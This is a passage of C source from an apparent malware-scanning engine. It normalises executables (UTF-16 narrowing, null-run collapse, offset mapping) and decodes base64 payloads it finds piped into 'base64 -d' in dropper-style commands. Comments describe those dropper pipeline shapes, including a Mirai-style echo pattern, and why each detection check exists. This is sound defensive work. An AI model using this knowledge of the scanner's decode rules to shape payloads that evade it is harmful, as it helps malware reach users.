/*
 * executables.c - see executables.h.
 *
 * ONE PASS, AND THE ORDER INSIDE IT IS DECIDED RATHER THAN INCIDENTAL.
 *
 * At each position the wide test runs before the zero test. In practice they
 * never both fire - the zeros inside a UTF-16 run are single bytes and the zero
 * rule needs eight in a row - but "never in practice" is the sort of thing that
 * stops being true, and a reader should not have to work out which wins.
 */

#include <stdlib.h>
#include <string.h>
#include <kofcore.h>

#include "executables.h"
#include "executables_private.h"
#include <uncoat.h>

/*
 * Decode the run `p[0..n)` where it sits, through libuncoat's one transform, with `k32` as the
 * step's number (the separator, for the escape coding). The write trails the read for every
 * coding used here, so no copy is needed.
 *
 * Returns the bytes written, or 0 unless the lib says the decode is COMPLETE -
 * the contract these call sites were written against: a run the coding cannot
 * read whole is left to the caller as "decoded to nothing".
 */
uint64_t kof_exe_decode_run(uint32_t algo, uint32_t flags, uint32_t k32, uint8_t *p, uint64_t n)
{
	struct kuncoat_step s = { .algo = algo, .dir = KUNCOAT_DECODE, .flags = flags, .k32 = k32, .key = NULL, .key_len = 0,
				  .max_out = 0 };
	uint64_t got = 0;

	if (kuncoat_transform(&s, p, n, p, n, &got) != KUNCOAT_OK)
		return 0;
	return got;
}

/*
 * Open or extend a span.
 *
 * A COPY that follows a COPY is the same stretch seen twice - the walk emits a
 * byte at a time - so it is merged rather than recorded again. Without this a
 * file with no zero runs and no wide text would produce one span per byte,
 * which is the opposite of what the map is for.
 */
static int span_put(struct kof_exe_norm_span *spans, uint32_t cap, uint32_t *n,
		    uint8_t kind, uint64_t src_off, uint64_t src_len,
		    uint64_t dst_off, uint64_t dst_len)
{
	struct kof_exe_norm_span *s;

	if (!spans)
		return 1;                       /* the caller does not want them */
	if (*n && kind == KOF_EXE_NORM_COPY) {
		s = &spans[*n - 1u];
		if (s->kind == KOF_EXE_NORM_COPY &&
		    s->src_off + s->src_len == src_off &&
		    s->dst_off + s->dst_len == dst_off) {
			s->src_len += src_len;
			s->dst_len += dst_len;
			return 1;
		}
	}
	if (*n >= cap)
		return 0;
	s = &spans[(*n)++];
	s->src_off = src_off;
	s->src_len = src_len;
	s->dst_off = dst_off;
	s->dst_len = dst_len;
	s->kind    = kind;
	return 1;
}

uint64_t kof_exe_norm(const uint8_t *in, uint64_t n, uint32_t ops,
		  uint8_t *out, uint64_t cap,
		  struct kof_exe_norm_span *spans, uint32_t span_cap,
		  uint32_t *n_spans)
{
	uint64_t i = 0, o = 0;
	uint32_t ns = 0;
	int changed = 0;

	if (n_spans)
		*n_spans = 0;
	if (!in || !out || !n || cap < n || !ops)
		return 0;

	while (i < n) {
		uint64_t k;

		if ((ops & KOF_EXE_NORM_UNWIDE) &&
		    (k = wide_run(in, n, i)) >= KOF_EXE_NORM_WIDE_MIN) {
			uint64_t j;

			for (j = 0; j < k; j++)
				out[o + j] = in[i + 2u * j];
			if (!span_put(spans, span_cap, &ns, KOF_EXE_NORM_UNWIDENED,
				      i, 2u * k, o, k))
				return 0;
			i += 2u * k;
			o += k;
			changed = 1;
			continue;
		}
		if ((ops & KOF_EXE_NORM_NULLRUN) &&
		    (k = zero_run(in, n, i)) >= KOF_EXE_NORM_NULL_MIN) {
			/*
			 * TWO, NOT ONE, AND NOT NONE - see the safety note in
			 * executables.h. Two zeros keep every zero-free pattern
			 * answering exactly as it did on the original.
			 */
			out[o] = 0u;
			out[o + 1u] = 0u;
			if (!span_put(spans, span_cap, &ns, KOF_EXE_NORM_NULLS,
				      i, k, o, 2u))
				return 0;
			i += k;
			o += 2u;
			changed = 1;
			continue;
		}
		out[o] = in[i];
		if (!span_put(spans, span_cap, &ns, KOF_EXE_NORM_COPY, i, 1u, o, 1u))
			return 0;
		i++;
		o++;
	}

	if (!changed)
		return 0;               /* the common case - see executables.h */
	if (n_spans)
		*n_spans = ns;
	return o;
}

int kof_exe_norm_src_of(const struct kof_exe_norm_span *spans, uint32_t n_spans,
		    uint64_t dst, uint64_t *src)
{
	uint32_t lo = 0, hi = n_spans;

	if (!spans || !n_spans || !src)
		return 0;
	/* The spans cover the output with no holes and in order, so this is an
	 * ordinary binary search on dst_off. */
	while (lo < hi) {
		uint32_t mid = lo + (hi - lo) / 2u;
		const struct kof_exe_norm_span *s = &spans[mid];

		if (dst < s->dst_off) {
			hi = mid;
		} else if (dst >= s->dst_off + s->dst_len) {
			lo = mid + 1u;
		} else {
			uint64_t k = dst - s->dst_off;

			switch (s->kind) {
			case KOF_EXE_NORM_UNWIDENED:
				*src = s->src_off + 2u * k;
				break;
			case KOF_EXE_NORM_NULLS:
				/* Every byte of the run is zero, so the head of
				 * it is as true an answer as any byte inside. */
				*src = s->src_off;
				break;
			default:
				*src = s->src_off + k;
				break;
			}
			return 1;
		}
	}
	return 0;
}

int kof_exe_unwide(const uint8_t *in, uint64_t n, uint8_t *out)
{
	uint64_t i = 0;
	int changed = 0;

	if (!in || !out || !n)
		return 0;
	memcpy(out, in, (size_t)n);
	while (i + 1u < n) {
		uint64_t k = wide_run(in, n, i);

		if (k < KOF_EXE_NORM_WIDE_MIN) {
			i++;
			continue;
		}
		{
			uint64_t j;

			for (j = 0; j < k; j++)
				out[i + j] = in[i + 2u * j];
			/* The vacated half of the run. Zeros, because a literal
			 * cannot contain one, so nothing can match across it. */
			memset(out + i + k, 0, (size_t)k);
		}
		i += 2u * k;
		changed = 1;
	}
	return changed;
}

/* Grow a table of `esz`-byte entries to hold `need`; the cost is checked against
 * the allowance before the allocator is asked. 0 when it could not. */
static int dec_grow(void **v, uint32_t *cap, size_t esz, uint32_t need, uint64_t room)
{
	uint64_t ncap = *cap ? 2u * (uint64_t)*cap : 64u;
	void *nv;

	if (ncap < need)
		ncap = need;
	if (ncap > UINT32_MAX / 2u || ncap * esz > room)
		return 0;
	nv = realloc(*v, (size_t)(ncap * esz));
	if (!nv)
		return 0;
	*v = nv;
	*cap = (uint32_t)ncap;
	return 1;
}

void kof_exe_dec_note(struct dec_out *o, uint64_t off, uint64_t len)
{
	if (!o || !o->want)
		return;
	if (o->n == o->cap &&
	    !dec_grow((void **)&o->v, &o->cap, sizeof *o->v, o->n + 1u, o->room)) {
		o->limit |= KOF_EXE_DEC_TABLE;
		return;
	}
	o->v[o->n].off = off;
	o->v[o->n].len = len;
	o->n++;
}

/*
 * NOTE A STRETCH A PASS WROTE, AND THE NEIGHBOUR ITS FILL EXPOSED.
 *
 * A round walks only what the round before it wrote, which is what makes honest
 * layering walk less every round. But a write is not only new bytes: the decoded
 * run is shorter than its source and the rest of the source is zero-filled, and a
 * NUL is a legal delimiter. So the token that FOLLOWS the stretch may have been
 * refused a round ago for what stood in front of it (`,<hex>SGVs... | base64 -d`:
 * a comma is not a base64 delimiter, a NUL is) and is readable now, while lying
 * wholly outside the stretch - the second round never looked at it, and it stayed
 * encoded until a second whole-object pass.
 *
 * So what is noted for the next round is two stretches: what was written (`off` for
 * `out_n` bytes) and, past the zero fill it left (which holds nothing and is not
 * walked), the token after it to the next hard delimiter plus the room an anchored
 * pass needs past a token: a separator run and the decoder's name (B64_SEP_MAX + 16
 * bytes). That is the whole of what a write can change about its surroundings, so
 * no rule is written for one payload shape. It costs the bytes of one token a write,
 * bounded by the same work budget as every other round; honest layering still walks
 * under two objects' worth.
 */
#define DEC_TAIL_ROOM 24u

void kof_exe_dec_note_run(struct dec_out *o, const uint8_t *p, uint64_t n,
			  uint64_t off, uint64_t out_n, uint64_t src_end)
{
	uint64_t e = src_end;

	if (!o || !o->want)
		return;
	kof_exe_dec_note(o, off, out_n);
	while (e < n && p[e] != 0 && p[e] != ' ' && p[e] != '\t' &&
	       p[e] != '\n' && p[e] != '\r')
		e++;
	e = n - e > DEC_TAIL_ROOM ? e + DEC_TAIL_ROOM : n;
	/* The zero fill is not walked - it holds nothing - only what follows it. */
	if (e > src_end)
		kof_exe_dec_note(o, src_end, e - src_end);
}

/*
 * THE BASE64 PASS. See the note on kof_exe_unb64 in the header for why it is
 * here at all; what follows is why each test is the test it is, and every one
 * of those reasons was worked out in the cmdb64_00 unpacker (retired from bases/decomp) against real
 * droppers rather than reasoned out here.
 */

/* How far back a separator run may reach between the payload and the decoder.
 * "  |  " is five; longer than this is not a pipeline, it is two unrelated
 * things that happen to be near each other. */
#define B64_SEP_MAX   8u

/* Below this a run is not a payload. Sixteen characters decode to twelve bytes,
 * which is shorter than any second stage worth having and is about where
 * ordinary words stop being mistakable for one. */
#define B64_RUN_MIN   16u

/*
 * NO CAP ON HOW MANY PAYLOADS, AND NONE ON HOW LONG ONE IS. There was one of each
 * (8 payloads a pass, 65536 characters walked back) and a file past either kept
 * its payloads encoded with nothing to say so - a literal no rule could match.
 * Neither bound was protecting anything: the walk back from an anchor stops at
 * the first byte that is not part of a run, and the text of the previous anchor
 * ("base64 -d") always holds a space and a dash, so two anchors never walk the
 * same bytes and the pass is linear in the object however many there are. A
 * decoded run is zeroed behind itself, which is also why a second pass finds
 * nothing.
 */

/* The alphabet, as comparisons. A table would be faster and this is not the hot
 * path - it runs only where the anchor already matched. */
/* A character that may appear INSIDE a run: the alphabet, its padding, and the
 * line breaks a wrapped payload carries. */
static int b64_run_char(uint8_t c)
{
	return kof_b64_val(c) >= 0 || c == '=' || c == '\n' || c == '\r';
}

/*
 * IS THERE A DECODER AT `i`, and which spelling.
 *
 * Returns its length, or 0. `base64 -d` is a prefix of `base64 -di`, so the
 * short form finds both; `--decode` and the macOS `-D` share no prefix with it
 * and are tested separately. One search for "base64 -" covers all three, where
 * the module declared three strings because its search was the database's.
 */
static uint32_t b64_anchor_at(const uint8_t *p, uint64_t n, uint64_t i)
{
	if (n - i < 9u)                 /* the shortest is "base64 -d" */
		return 0;
	if (memcmp(p + i, "base64 -", 8u))
		return 0;
	/* p[i + 7] is that '-'; what follows it decides the spelling. */
	if (n - i >= 15u && !memcmp(p + i + 7u, "--decode", 8u))
		return 15u;
	if (p[i + 8u] == 'd' || p[i + 8u] == 'D')
		return 9u;
	return 0;
}

int kof_exe_pass_b64(uint8_t *p, uint64_t n, uint64_t from, uint64_t to,
		       struct dec_out *wrote)
{
	uint64_t i;
	int changed = 0;

	if (!p || !n)
		return 0;
	if (to > n)
		to = n;

	for (i = from; i + 8u < to; i++) {
		uint64_t run_end, run_beg, j;
		uint64_t out_n = 0;
		uint8_t  before;
		int      piped = 0;

		/*
		 * SKIP TO THE NEXT 'b' RATHER THAN ASK AT EVERY BYTE.
		 *
		 * b64_anchor_at begins with memcmp(p + i, "base64 -", 8), so a
		 * position whose byte is not 'b' cannot match - and this loop
		 * was asking it once per byte of every executable scanned.
		 * Measured with callgrind over 120 system binaries (109 MB):
		 * unb64_range was 728 million instructions, almost all of it
		 * this test failing on its first byte.
		 *
		 * memchr is the same question asked of a whole cache line at a
		 * time - glibc's is SIMD - and 'b' is about one byte in 256 of
		 * binary, so one scan replaces a couple of hundred memcmps.
		 * Nothing is skipped that could have matched: every position
		 * passed over holds a byte that is not 'b'.
		 */
		if (p[i] != 'b') {
			const uint8_t *hit = memchr(p + i, 'b',
						    (size_t)(to - i));

			if (!hit)
				break;
			i = (uint64_t)(hit - p);
			if (i + 8u >= to)
				break;
		}
		if (!b64_anchor_at(p, n, i))
			continue;

		/*
		 * BACK OVER THE PIPE, THEN BACK OVER THE PAYLOAD.
		 *
		 * In `echo <payload> | base64 -d` the payload is the run that
		 * ENDS at the pipe. Nearest, not longest-in-the-string: a
		 * longer run elsewhere in the same command is a different
		 * question that happens to share the answer most of the time.
		 */
		run_end = i;
		for (j = 0; j < B64_SEP_MAX && run_end > 0; j++) {
			uint8_t c = p[run_end - 1u];

			if (c == '|' || c == '<' || c == '>')
				piped = 1;
			else if (c != ' ' && c != '\t' && c != ')' &&
				 c != '"' && c != '\'')
				break;
			run_end--;
		}
		/*
		 * THE DECODER'S INPUT HAS TO COME FROM THE RUN, and a space
		 * does not say that. `base64 -d` reads stdin, so something must
		 * be piped or redirected into it; a bare space in front means
		 * its input is a file argument and the bytes before it are just
		 * the previous word. Without this,
		 * "ThisIsALongIdentifierLikeString base64 -d" decoded to
		 * twenty-three bytes of noise.
		 *
		 * The quotes are separators rather than terminators because
		 * `echo "<payload>" | base64 -d` is the Mirai shape and the
		 * closing quote sits between the payload and the pipe.
		 */
		if (!piped)
			continue;

		run_beg = run_end;
		while (run_beg > 0 && b64_run_char(p[run_beg - 1u]))
			run_beg--;
		/*
		 * PADDING ONLY EVER COMES LAST, so an `=` with a real
		 * character after it is a SEPARATOR and the payload starts
		 * after the last one. Without it `VAR=<payload> | base64 -d`
		 * walks back through the `=` into the variable's name - which
		 * is base64 characters too - and every group shifts.
		 */
		for (j = run_beg; j + 1u < run_end; j++)
			if (p[j] == '=' && p[j + 1u] != '=')
				run_beg = j + 1u;

		if (run_end - run_beg < B64_RUN_MIN)
			continue;
		/*
		 * AND THE RUN HAS TO BE DELIMITED. A run must not be a window
		 * onto bytes belonging to something else - a symbol table, a
		 * pointer, the tail of another string - and a payload is an
		 * argument, so it follows a NUL, a space, a quote or a bracket.
		 */
		before = run_beg ? p[run_beg - 1u] : 0;
		if (before != 0 && before != ' ' && before != '\t' &&
		    before != '"' && before != '\'' && before != '(' &&
		    before != '=' && before != '\n')
			continue;

		/*
		 * DECODE IN PLACE. The write always trails the read - three
		 * bytes out per four in - so the output cannot overtake what
		 * has not been read yet, and no copy is needed.
		 */
		if (wrote && wrote->probe) {
			/* Would it decode, without writing: on a copy of the run. */
			uint8_t *c = malloc((size_t)(run_end - run_beg));
			int ok;

			if (!c)
				return 1;      /* cannot tell: the full pass will */
			memcpy(c, p + run_beg, (size_t)(run_end - run_beg));
			ok = kof_exe_decode_run(KUNCOAT_ALGO_B64, KUNCOAT_F_LAX, 0, c,
					     run_end - run_beg) != 0;
			free(c);
			if (ok)
				return 1;
			continue;
		}
		out_n = kof_exe_decode_run(KUNCOAT_ALGO_B64, KUNCOAT_F_LAX, 0,
					p + run_beg, run_end - run_beg);
		/*
		 * A run that decoded to nothing is left exactly as it was.
		 * Zeroing it would remove bytes the matcher can still read for
		 * no gain, and it is the one case where the rewrite would lose
		 * rather than reveal.
		 */
		if (!out_n)
			continue;
		/* The vacated tail. Zeros, for the reason at the top of this
		 * file: a literal cannot contain one, so nothing matches across
		 * it - and it is also what makes a second pass find nothing. */
		memset(p + run_beg + out_n, 0, (size_t)(run_end - run_beg - out_n));
		kof_exe_dec_note_run(wrote, p, n, run_beg, out_n, run_end);
		changed = 1;
	}
	return changed;
}

int kof_exe_unb64(uint8_t *p, uint64_t n)
{
	return kof_exe_pass_b64(p, n, 0, n, NULL);
}

/*
 * WHERE A PARENT'S OFFSET LANDS IN THE VIEW.
 *
 * The inverse of kof_exe_norm_src_of, and it does not use the span map. The
 * map answers one question at a time from a table that has a row per run - a
 * binary with forty thousand zero runs needs forty thousand rows before the
 * first question can be asked, and the caller here has about thirty questions.
 *
 * So the transform is replayed instead, once, against a SORTED list of the
 * offsets somebody wants to know about. One pass, no table, and it is the same
 * loop as kof_exe_norm above - which is the reason it sits directly beneath it
 * and the reason a test pins the two together rather than trusting the reading.
 *
 * WHAT AN OFFSET INSIDE A COLLAPSED RUN MEANS. Most of such a run has no view
 * byte to point at, so there is a choice to make and it is made the same way in
 * both directions: an offset AT the run's first byte answers with the start of
 * what the run became, and an offset anywhere after it answers with the position
 * just past it.
 *
 * That is what a region table needs. A region beginning where the run begins
 * keeps the two bytes the run collapsed to; a region lying WHOLLY inside the
 * run comes back with a length of zero, which is the truthful answer - it was
 * padding, the padding is gone, and there is nothing in the view for a rule to
 * search. The resolver drops a region of zero length for that reason.
 */
void kof_exe_norm_map(const uint8_t *in, uint64_t n, uint32_t ops,
		      const uint64_t *src, uint64_t *dst, uint32_t k)
{
	uint64_t i = 0, o = 0;
	uint32_t q = 0;

	if (!in || !src || !dst || !k)
		return;
	if (!n || !ops) {
		/* No op: the view is the input, so a place inside it is its own
		 * answer and a place at or past the end is the end of the view, the
		 * same as in the replay below. It answered every place with itself,
		 * so 1000 in a 64 byte input came back 1000 in a view of 64. */
		for (; q < k; q++)
			dst[q] = src[q] < n ? src[q] : n;
		return;
	}
	while (i < n && q < k) {
		uint64_t step_in, step_out;

		/* Every query this step passes is answered before the step is
		 * taken, so a query landing inside a run gets the run's start. */
		while (q < k && src[q] <= i) {
			dst[q] = o;
			q++;
		}
		if (q == k)
			break;
		if ((ops & KOF_EXE_NORM_UNWIDE) &&
		    (step_out = wide_run(in, n, i)) >= KOF_EXE_NORM_WIDE_MIN) {
			step_in = 2u * step_out;
		} else if ((ops & KOF_EXE_NORM_NULLRUN) &&
			   (step_in = zero_run(in, n, i)) >=
			   KOF_EXE_NORM_NULL_MIN) {
			step_out = 2u;
		} else {
			step_in = step_out = 1u;
		}
		i += step_in;
		o += step_out;
	}
	/* Anything at or past the end of the input maps to the end of the
	 * view. A region that runs to the last byte is the ordinary case and
	 * its end offset is one past it. */
	for (; q < k; q++)
		dst[q] = o;
}

/*
 * THE SAME TRANSFORM, BUT NOT EVERYWHERE.
 *
 * WHY A BITMAP AND NOT A LIST OF REGIONS. Regions OVERLAP. An ELF's header
 * tables sit inside the first PT_LOAD, so HEADERS and DATA cover some of the
 * same bytes, and a walk that took each region in turn would normalise those
 * bytes as data and then copy them as headers, or the other way round
 * depending on the order the resolver happened to return. A byte either may be
 * rewritten or it may not, so that is what is recorded: one bit per byte, and
 * KEEPING WINS. A byte claimed by both a kept region and a rewritten one is
 * kept, because the reason to keep it has not gone away by being overlapped.
 *
 * WHAT A RUN MAY NOT DO IS STRADDLE. A zero run that begins in data and
 * continues into the header is collapsed only as far as the header, because
 * collapsing the rest would move the header - and the header is kept precisely
 * so that nothing moves it. The run test therefore stops at the first kept
 * byte rather than looking past it.
 *
 * `mark` is a sorted list of parent offsets whose view positions the caller
 * wants back in `mark_out` - the region boundaries, so the view can carry a
 * region table of its own. It is the same service kof_exe_norm_map performs
 * for the unmasked transform, done here in the one pass that already exists
 * rather than by replaying a second one that would have to be kept in step.
 */
static int keep_at(const uint8_t *keep, uint64_t i)
{
	return keep && (keep[i >> 3] & (uint8_t)(1u << (i & 7u)));
}

/*
 * How far a run may reach before it meets a byte that must not move.
 *
 * CACHED BY THE CALLER, WHICH IS NOT AN OPTIMISATION BUT THE DIFFERENCE
 * BETWEEN LINEAR AND QUADRATIC. This walks forward to the next kept byte, so
 * asking it once per output byte scans the whole unkept stretch once per byte
 * of that stretch. On a binary whose kept regions are a few hundred bytes near
 * each end, that is the length of the file squared - measured as a scan that
 * did not finish in ten minutes rather than as a slow one. The caller keeps the
 * answer and asks again only once it has been used up, which makes the total
 * walk linear because `i` never goes backwards.
 */
/*
 * WHERE THE NEXT KEPT BYTE IS - READ A MAP BYTE AT A TIME, NOT A BIT.
 *
 * This walks the run of NOT-kept bytes, and that run is most of an object:
 * NORM_KEEP_MASK keeps the headers and the executable sections, so everything
 * else - DATA, the unclaimed tail, the parts of CODE that are not instructions
 * - is walked here to find where the next kept byte begins.
 *
 * A bit at a time, that is a load, a shift, a mask and a test for every byte of
 * the object. Measured with callgrind over 300 corpus files: keep_at, which is
 * almost entirely this loop, was 5.79 billion instructions - 23.9% of the whole
 * scan and the most expensive line in the engine.
 *
 * A map byte that is 0x00 says eight bytes in a row are not kept, which is the
 * same answer eight times. So the middle loop reads one byte and steps eight,
 * and the two loops around it handle the ends where the run is not aligned to
 * the map. The answer is the same offset either way - this only stops asking
 * the same question eight times.
 */
static uint64_t keep_bound(const uint8_t *keep, uint64_t n, uint64_t i)
{
	uint64_t e = i;

	if (!keep)
		return n;
	while (e < n && (e & 7u) != 0u && !keep_at(keep, e))
		e++;
	/*
	 * AND EIGHT MAP BYTES AT A TIME, which is sixty-four of the object.
	 *
	 * A map byte of 0x00 answers for eight bytes; a machine word of them
	 * answers for sixty-four, and "is this word zero" is one compare
	 * whatever the byte order is - nothing here reads a byte's position
	 * inside the word, so there is no endianness to get wrong.
	 *
	 * memcpy rather than a cast: the map is a byte array and need not be
	 * aligned for a 64-bit load. Every compiler this tree builds with turns
	 * a fixed-size memcpy into that single load.
	 */
	while (e + 64u <= n) {
		uint64_t w;

		memcpy(&w, keep + (e >> 3), sizeof w);
		if (w != 0u)
			break;
		e += 64u;
	}
	while (e + 8u <= n && keep[e >> 3] == 0u)
		e += 8u;
	while (e < n && !keep_at(keep, e))
		e++;
	return e;
}

/*
 * Copy a run of the object to where the view has reached. `dst` may lie in the very buffer
 * `src` is read from (the collapse runs in place, dst <= src): nothing to do while they are the
 * same place, memcpy when the two runs do not touch (what the two-buffer call always did), memmove
 * only when they overlap. A bare memmove cost 2.5 M instructions on a 15 MB PE.
 */
static inline void move_run(uint8_t *dst, const uint8_t *src, size_t n)
{
	if (dst == src)
		return;
	if (dst + n <= src || src + n <= dst)
		memcpy(dst, src, n);
	else
		memmove(dst, src, n);
}

uint64_t kof_exe_norm_masked(const struct kof_exe_norm_req *rq,
			     struct kof_exe_norm_res *res)
{
	/* The request is read once, here: the walk below is per byte and works
	 * from these locals exactly as it did when they were parameters. */
	const uint8_t *in = rq->in, *keep = rq->keep, *drop = rq->drop;
	const uint64_t n = rq->n, *mark = rq->mark;
	const uint32_t ops = rq->ops, n_mark = rq->n_mark;
	uint8_t *out = res->out;
	const uint64_t cap = res->cap;
	uint64_t *mark_out = res->mark_out;
	uint64_t i = 0, o = 0, lim = 0, kn = 0, dn = 0;   /* kn, dn: see "NEXT KEPT" below */
	uint32_t q = 0, did = 0;
	int changed = 0;
	/*
	 * THE NEXT BOUNDARY, HELD IN A REGISTER.
	 *
	 * The test for it runs once per byte of every executable scanned, and
	 * it was four: `q < n_mark`, `mark`, `mark_out`, and a LOAD of
	 * mark[q]. Two of those are loop-invariant - whether the caller asked
	 * for boundaries at all does not change while the walk runs - and the
	 * load was re-reading a value that only moves when a boundary is
	 * passed, which is at most n_mark times in the whole walk.
	 *
	 * Measured with callgrind over 120 system binaries (109 MB): that one
	 * line was 470 million instructions, 3.87% of the entire scan and the
	 * single most expensive line in the engine.
	 *
	 * So the invariants are decided once and the next boundary is kept
	 * here: the per-byte question becomes `i >= next_mark`, one compare
	 * against a register. KOF_NO_MARK is past any offset an object can
	 * have, so the test is simply false once the last boundary is passed.
	 */
	const uint64_t *mk = (mark && mark_out) ? mark : NULL;
	uint32_t nm = mk ? n_mark : 0u;
	uint64_t next_mark;

	res->fired = 0;

	if (!in || !out || !n || cap < n)
		return 0;

	next_mark = q < nm ? mk[q] : ~(uint64_t)0;

	while (i < n) {
		uint64_t k;

		while (i >= next_mark) {
			mark_out[q++] = o;
			next_mark = q < nm ? mk[q] : ~(uint64_t)0;
		}

		/*
		 * A RUN THAT IS ENTIRELY KEPT COPIES WHOLE.
		 *
		 * The map says CODE is kept, and CODE is not a scattering of
		 * bytes - it is megabytes in one piece, so the keep map over it
		 * is a long row of 0xff. Every one of those bytes reached the
		 * same place by the same road: keep_at says kept, so copy one
		 * byte and go round again. That made keep_at the most expensive
		 * line left in this function - 891 million instructions, 43% of
		 * it, measured over 120 system binaries - to decide something
		 * eight bytes at a time already knew.
		 *
		 * So whole 0xff bytes of the map are counted first and the run
		 * they cover is one memcpy. The conditions are what make it the
		 * SAME answer: `drop` must be absent, because a dropped byte is
		 * removed rather than copied and this copies; the run stops at
		 * the next boundary, so mark_out still records the offset that
		 * boundary actually landed on; and it starts on a map byte so
		 * that 0xff means all eight.
		 *
		 * `o <= i` throughout - every branch writes at most what it
		 * consumes - so out has room for the copy by the cap test at
		 * the top.
		 */
		/*
		 * AND IT STILL COPIES WHOLE WHEN A LIBRARY IS BEING CUT.
		 *
		 * This read `keep && !drop`, so the whole bulk path switched
		 * off the moment the caller passed a drop map - and the object
		 * that has one is the STATIC BINARY, which is exactly the
		 * object whose CODE is megabytes in one piece. Cutting three
		 * megabytes of libc out of a static build meant the other
		 * several megabytes of author code went one byte at a time
		 * through keep_at, which is the line this bulk path was
		 * written to retire.
		 *
		 * `drop[b] == 0` is the same answer, not a weaker one. On the
		 * byte path drop is tested BEFORE keep, so a map byte with no
		 * bit set means no byte of those eight is removed, and each of
		 * them then falls to `keep_at(keep, i)` and is copied. Eight
		 * copies and one memcpy put the same bytes in the same place.
		 * Nothing else moves: KOF_EXE_NORM_CUTLIB is raised only where
		 * a byte is actually dropped and no byte here is, `lim` is
		 * untouched because the run is kept rather than collapsed, and
		 * the run still stops at next_mark so the boundaries land where
		 * they did.
		 *
		 * TWO LOOPS AND NOT ONE CONDITION. Folding `drop` into the
		 * existing test would add a load and a compare to every object
		 * in the corpus to speed up the ones that have a drop map. The
		 * object without one takes the loop it always took.
		 */
		if (keep && (i & 7u) == 0u) {
			uint64_t run = 0, left = n - i;

			if (!drop) {
				while (run + 8u <= left &&
				       keep[(i + run) >> 3] == 0xffu)
					run += 8u;
			} else {
				while (run + 8u <= left &&
				       keep[(i + run) >> 3] == 0xffu &&
				       drop[(i + run) >> 3] == 0u)
					run += 8u;
			}
			if (next_mark - i < run)
				run = next_mark - i;
			if (run) {
				move_run(out + o, in + i, (size_t)run);
				o += run;
				i += run;
				continue;
			}
		}

		/*
		 * DROPPED BEFORE ANYTHING ELSE, AND BEFORE KEPT.
		 *
		 * A dropped byte does not reach the view at all, so no rule
		 * about how to rewrite it can apply - and the one region that
		 * is otherwise kept whole, CODE, is exactly where the static
		 * library lives. Tested first because "keep" means "do not
		 * change this byte", not "do not remove it", and the caller
		 * asking for both about one byte means the stronger one.
		 */
		if (keep_at(drop, i)) {
			i++;
			did |= KOF_EXE_NORM_CUTLIB;
			changed = 1;
			lim = 0;        /* the cached run bound is stale now */
			continue;
		}
		if (keep_at(keep, i)) {
			out[o++] = in[i++];
			continue;
		}
		/* NEXT KEPT byte and next DROPPED byte, each held until the walk passes it: a map
		 * does not change, so the next set bit at or after i is the same bit for every i up
		 * to it, and finding it again walked the zero map to it each time (MEASURED, 234
		 * dynamic ELF: 40 811 calls, 294 000 Ir each, 12.0 G of 62.1 G). Bounded by the
		 * DROPPED byte too: collapsing across a hole would join two stretches not adjacent. */
		if (i >= lim) {
			if (i >= kn)
				kn = keep_bound(keep, n, i);
			if (i >= dn)
				dn = keep_bound(drop, n, i);
			lim = dn < kn ? dn : kn;
		}

		/*
		 * NEITHER TRANSFORM CAN START WHERE TWO NON-ZERO BYTES SIT, so
		 * the stretch between zeros is copied whole.
		 *
		 * Both rules below need a zero byte to begin at all -
		 * zero_run reads p[i], and wide_char is `hi == 0`, so
		 * wide_run reads p[i+1]. A position whose own byte and whose
		 * successor are both non-zero can only fall through to the
		 * verbatim copy at the bottom, and the two scans above it are
		 * asking a question whose answer is already known.
		 *
		 * MEASURED, because that fall-through is where this function
		 * spends its time. Callgrind over 300 corpus files: zero_run's
		 * loop 2.52 billion instructions, wide_char 2.07, wide_run's
		 * loop 1.74, the two calls 1.30 - 7.6 billion, 13.2% of the
		 * whole scan, to discover that a byte is ordinary. The region
		 * this runs over is everything NORM_KEEP_MASK does not keep,
		 * which is DATA and every byte of CODE that is not an
		 * instruction.
		 *
		 * WHERE IT STOPS. `z` is the next zero at or after i+1, so
		 * every position from i to z-2 has a non-zero byte and a
		 * non-zero successor; z-1 does not, because its successor is
		 * the zero. So the run ends at z-1 and the loop resumes there
		 * with nothing skipped. It is bounded by `lim` like the scans
		 * it replaces, and by `next_mark` like the kept-run copy
		 * above, so a mark inside it is still recorded at the offset
		 * it lands on.
		 */
		if (i + 1u < lim && in[i] != 0u && in[i + 1u] != 0u) {
			const uint8_t *z = memchr(in + i + 1u, 0,
						  (size_t)(lim - i - 1u));
			uint64_t stop = z ? (uint64_t)(z - in) - 1u : lim;

			if (next_mark < stop)
				stop = next_mark;
			if (stop > i) {
				move_run(out + o, in + i, (size_t)(stop - i));
				o += stop - i;
				i = stop;
				continue;
			}
		}

		if ((ops & KOF_EXE_NORM_UNWIDE) &&
		    (k = wide_run(in, lim, i)) >= KOF_EXE_NORM_WIDE_MIN) {
			uint64_t j;

			for (j = 0; j < k; j++)
				out[o + j] = in[i + 2u * j];
			i += 2u * k;
			o += k;
			changed = 1;
			did |= KOF_EXE_NORM_UNWIDE;
			continue;
		}
		if ((ops & KOF_EXE_NORM_NULLRUN) &&
		    (k = zero_run(in, lim, i)) >= KOF_EXE_NORM_NULL_MIN) {
			/* Two, not one - the safety note in executables.h. */
			out[o] = 0u;
			out[o + 1u] = 0u;
			i += k;
			o += 2u;
			changed = 1;
			did |= KOF_EXE_NORM_NULLRUN;
			continue;
		}
		out[o++] = in[i++];
	}
	/* Boundaries at or past the end land at the end of the view, which is
	 * what a region running to the last byte needs. */
	while (q < n_mark && mark_out)
		mark_out[q++] = o;

	res->fired = did;
	if (!changed)
		return 0;
	return o;
}

/* ---- hex text, and the layers under it ----------------------------------- */

/* Twelve bytes. Below it a run is as likely to be a number as a payload - see
 * the measurement in executables.h. */
#define HEX_RUN_MIN   24u

/* No count of payloads per pass, for the reason given at the base64 pass: the
 * walk is forward only, each byte is read once, and a decoded run is zeroed. */

/* The hex digit itself is kof_hex_val in kofcore.h, where the measurement
 * that made it a table is recorded - this loop is what made it. */

/* What a decoded byte may be for the run to be text: printable ASCII, and the
 * three whitespace characters a command or a hosts file carries. */
static int hex_text(uint8_t c)
{
	/*
	 * The printable range as one unsigned compare - see wide_char - and
	 * the three whitespace bytes as one shift of a three-bit set rather
	 * than three equality tests. 0x2600 is bits 9, 10 and 13. Checked
	 * against the four-comparison form on all 256 inputs.
	 */
	return ((uint8_t)(c - 0x20u) < 0x5fu) |
	       ((c < 14u) & (int)((0x2600u >> (c & 31u)) & 1u));
}

/* A payload is an argument, so it follows one of these - the same rule the
 * base64 walk applies, and the one that removes the only clean-file decodes
 * the printable test let through. */
static int hex_delim(uint8_t c)
{
